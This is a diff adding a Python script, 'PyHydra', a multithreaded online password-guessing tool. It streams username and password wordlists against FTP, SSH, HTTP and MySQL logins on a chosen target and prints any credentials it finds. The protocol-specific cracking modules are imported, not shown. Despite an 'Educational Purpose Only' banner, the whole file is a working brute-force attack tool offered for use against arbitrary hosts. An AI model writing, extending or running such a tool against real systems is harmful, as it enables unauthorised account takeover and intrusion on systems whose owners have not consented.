@@ -1,0 +1,274 @@
+import argparse
+import sys
+import time
+import threading
+from concurrent.futures import ThreadPoolExecutor
+
+# Import modules (Same as your project structure)
+try:
+    from modules.ftp_crack import FTPCracker
+    from modules.ssh_crack import SSHCracker
+    from modules.http_crack import HTTPCracker
+    from modules.mysql_crack import MySQLCracker
+    from utils.colors import Colors
+    from utils.logger import Logger
+except ImportError:
+    # Fallback placeholders for testing/standalone execution
+    class Colors:
+        RED = '\033[91m'
+        YELLOW = '\033[93m'
+        GREEN = '\033[92m'
+        CYAN = '\033[96m'
+        WHITE = '\033[97m'
+        RESET = '\033[0m'
+    class Logger:
+        def log_result(self, *args): pass
+        def set_output_file(self, *args): pass
+
+class PyHydra:
+    def __init__(self):
+        self.colors = Colors()
+        self.logger = Logger()
+        self.found = False
+        self.found_password = None
+        self.attempts = 0
+        self.lock = threading.Lock()
+        self.start_time = None
+        self.shutdown_flag = threading.Event()
+        
+        self.modules = {
+            'ftp': FTPCracker,
+            'ssh': SSHCracker,
+            'http': HTTPCracker,
+            'http-get': HTTPCracker,
+            'mysql': MySQLCracker
+        }
+    
+    def print_banner(self):
+        banner = f"""
+{self.colors.RED}╔══════════════════════════════════════════════╗
+║                                              ║
+║     {self.colors.YELLOW}██╗  ██╗ █████╗ ██████╗  ██████╗██╗  ██╗{self.colors.RED}    ║
+║     {self.colors.YELLOW}██║  ██║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝{self.colors.RED}    ║
+║     {self.colors.YELLOW}███████║███████║██████╔╝██║     █████╔╝ {self.colors.RED}    ║
+║     {self.colors.YELLOW}██╔══██║██╔══██║██╔══██╗██║     ██╔═██╗ {self.colors.RED}    ║
+║     {self.colors.YELLOW}██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗{self.colors.RED}    ║
+║     {self.colors.YELLOW}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{self.colors.RED}    ║
+║                                              ║
+║     {self.colors.CYAN}Python Password Cracker v2.0 (ADVANCED){self.colors.RED}  ║
+║     {self.colors.WHITE}Educational Purpose Only{self.colors.RED}              ║
+║                                              ║
+╚══════════════════════════════════════════════╝{self.colors.RESET}
+"""
+        print(banner)
+    
+    def load_wordlist(self, wordlist_path):
+        """Yields passwords one by one to save memory (Generator approach)"""
+        try:
+            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    cleaned = line.strip()
+                    if cleaned:
+                        yield cleaned
+        except FileNotFoundError:
+            print(f"{self.colors.RED}[-] Wordlist not found: {wordlist_path}{self.colors.RESET}")
+            sys.exit(1)
+    
+    def load_usernames(self, username_str, userlist_path):
+        """Load single username or list into memory (usernames usually small)"""
+        if userlist_path:
+            try:
+                with open(userlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    return [line.strip() for line in f if line.strip()]
+            except FileNotFoundError:
+                print(f"{self.colors.RED}[-] Userlist not found: {userlist_path}{self.colors.RESET}")
+                sys.exit(1)
+        else:
+            return [username_str]
+
+    def generate_combinations(self, usernames, passwords_generator):
+        """Generates credentials chunk-by-chunk without flooding RAM"""
+        for password in passwords_generator:
+            for username in usernames:
+                yield (username, password)
+
+    def try_login(self, cracker, username, password):
+        """Try single login attempt with robust safety checks"""
+        if self.found or self.shutdown_flag.is_set():
+            return None
+        
+        try:
+            result = cracker.try_login(username, password)
+            
+            with self.lock:
+                self.attempts += 1
+                
+            if result:
+                with self.lock:
+                    self.found = True
+                    self.found_password = password
+                return (username, password)
+        except Exception:
+            # Protocol specific connection drops handle karne ke liye
+            with self.lock:
+                self.attempts += 1
+        return None
+    
+    def print_progress(self, total_combinations=None):
+        """Clean background progress updater"""
+        while not self.found and not self.shutdown_flag.is_set():
+            with self.lock:
+                elapsed = time.time() - self.start_time
+                attempts = self.attempts
+                
+            speed = attempts / elapsed if elapsed > 0 else 0
+            
+            if total_combinations:
+                progress = (attempts / total_combinations) * 100
+                stats = f"\r{self.colors.CYAN}[*] Attempts: {attempts}/{total_combinations} | Speed: {speed:.1f}/s | Progress: {progress:.1f}%{self.colors.RESET}"
+            else:
+                stats = f"\r{self.colors.CYAN}[*] Attempts: {attempts} | Speed: {speed:.1f}/s (Scanning wordlist...){self.colors.RESET}"
+                
+            sys.stdout.write(stats)
+            sys.stdout.flush()
+            time.sleep(0.3)
+            
+    def start_attack(self, target, protocol, usernames, passlist_path, single_password, threads, port=None):
+        """Advanced attack architecture using generators and clean thread handling"""
+        if protocol not in self.modules:
+            print(f"{self.colors.RED}[-] Unsupported protocol: {protocol}{self.colors.RESET}")
+            return
+        
+        cracker_class = self.modules[protocol]
+        cracker = cracker_class(target, port)
+        
+        # Wordlist configuration using Generator
+        passwords_gen = [single_password] if single_password else self.load_wordlist(passlist_path)
+        
+        # Total combinations calculation (Only if it's not a massive list or single password)
+        total_combinations = None
+        if single_password:
+            total_combinations = len(usernames)
+        elif passlist_path:
+            # Performance note: file size check se calculate kar sakte hain, agar skip karna ho toh None rahega
+            try:
+                with open(passlist_path, 'rb') as f:
+                    total_combinations = sum(1 for _ in f) * len(usernames)
+            except Exception:
+                total_combinations = None
+
+        print(f"{self.colors.GREEN}[+] Target: {target}:{cracker.port}{self.colors.RESET}")
+        print(f"{self.colors.GREEN}[+] Protocol: {protocol.upper()}{self.colors.RESET}")
+        print(f"{self.colors.GREEN}[+] Users Loaded: {len(usernames)}{self.colors.RESET}")
+        print(f"{self.colors.GREEN}[+] Threads: {threads}{self.colors.RESET}")
+        if total_combinations:
+            print(f"{self.colors.GREEN}[+] Total Combinations: {total_combinations}{self.colors.RESET}")
+        print(f"{self.colors.YELLOW}{'─' * 50}{self.colors.RESET}")
+        
+        self.start_time = time.time()
+        
+        # Progress thread invocation
+        progress_thread = threading.Thread(target=self.print_progress, args=(total_combinations,))
+        progress_thread.daemon = True
+        progress_thread.start()
+        
+        # Combinations stream iterator
+        combo_stream = self.generate_combinations(usernames, passwords_gen)
+        
+        try:
+            with ThreadPoolExecutor(max_workers=threads) as executor:
+                futures = set()
+                
+                for username, password in combo_stream:
+                    if self.found or self.shutdown_flag.is_set():
+                        break
+                    
+                    # Throttling/Backpressure management: Queue ko thread capacity se zyada flood nahi hone deta
+                    if len(futures) >= threads * 2:
+                        # Completed futures ko clear out karne ke liye sweep pipeline
+                        futures = {f for f in futures if not f.done()}
+                        if len(futures) >= threads * 2:
+                            time.sleep(0.01) # Small cool-off to let workers catch up
+                            
+                    future = executor.submit(self.try_login, cracker, username, password)
+                    futures.add(future)
+                    
+                    # Check instant responses
+                    for f in list(futures):
+                        if f.done():
+                            result = f.result()
+                            if result:
+                                self.success_output(target, protocol, cracker.port, result[0], result[1])
+                                return
+
+                # Final sweep for remaining active threads
+                for future in futures:
+                    result = future.result()
+                    if result and self.found:
+                        self.success_output(target, protocol, cracker.port, result[0], result[1])
+                        return
+
+        except KeyboardInterrupt:
+            print(f"\n{self.colors.YELLOW}[!] Caught Ctrl+C. Shutting down worker threads safely...{self.colors.RESET}")
+            self.shutdown_flag.set()
+            
+        if not self.found and not self.shutdown_flag.is_set():
+            elapsed = time.time() - self.start_time
+            print(f"\n{self.colors.RED}[-] Password not found.{self.colors.RESET}")
+            print(f"{self.colors.RED}[-] Time Elapsed: {elapsed:.2f}s | Total attempts: {self.attempts}{self.colors.RESET}")
+
+    def success_output(self, target, protocol, port, username, password):
+        """Displays formatted execution closure report on match"""
+        elapsed = time.time() - self.start_time
+        print(f"\n\n{self.colors.GREEN}{'═' * 50}{self.colors.RESET}")
+        print(f"{self.colors.GREEN}[+] {self.colors.RED}CREDENTIALS IDENTIFIED!{self.colors.RESET}")
+        print(f"{self.colors.GREEN}[+] URL: {protocol.upper()}://{target}:{port}{self.colors.RESET}")
+        print(f"{self.colors.GREEN}[+] Username: {self.colors.YELLOW}{username}{self.colors.RESET}")
+        print(f"{self.colors.GREEN}[+] Password: {self.colors.YELLOW}{password}{self.colors.RESET}")
+        print(f"{self.colors.GREEN}[+] Duration: {elapsed:.2f}s | Speed: {self.attempts / elapsed:.1f}/s{self.colors.RESET}")
+        print(f"{self.colors.GREEN}{'═' * 50}{self.colors.RESET}")
+        self.logger.log_result(target, protocol, username, password)
+
+    def run(self):
+        """Robust argparse initialization with conflict resolutions"""
+        parser = argparse.ArgumentParser(
+            description="PyHydra Advance - High-Performance Python Password Cracker",
+            epilog="Example: python pyhydra.py -t 192.168.1.1 -m ftp -u admin -P wordlist.txt"
+        )
+        
+        parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
+        parser.add_argument('-m', '--protocol', required=True, 
+                            choices=['ftp', 'ssh', 'http', 'http-get', 'mysql'], help='Attack mode/protocol')
+        
+        user_group = parser.add_mutually_exclusive_group(required=True)
+        user_group.add_argument('-u', '--user', help='Target unique username')
+        user_group.add_argument('-U', '--userlist', help='Path to username list')
+        
+        pass_group = parser.add_mutually_exclusive_group(required=True)
+        pass_group.add_argument('-P', '--passlist', help='Path to password wordlist')
+        pass_group.add_argument('-p', '--password', help='Single password vector evaluation')
+        
+        parser.add_argument('-s', '--port', type=int, help='Override standard default port')
+        parser.add_argument('-w', '--threads', type=int, default=16, help='Thread pool size execution limit')
+        parser.add_argument('-o', '--output', help='File target location to write success logs')
+        
+        args = parser.parse_args()
+        self.print_banner()
+        
+        usernames = self.load_usernames(args.user, args.userlist)
+        if args.output:
+            self.logger.set_output_file(args.output)
+            
+        self.start_attack(
+            target=args.target,
+            protocol=args.protocol,
+            usernames=usernames,
+            passlist_path=args.passlist,
+            single_password=args.password,
+            threads=args.threads,
+            port=args.port
+        )
+
+if __name__ == "__main__":
+    hydra = PyHydra()
+    hydra.run()
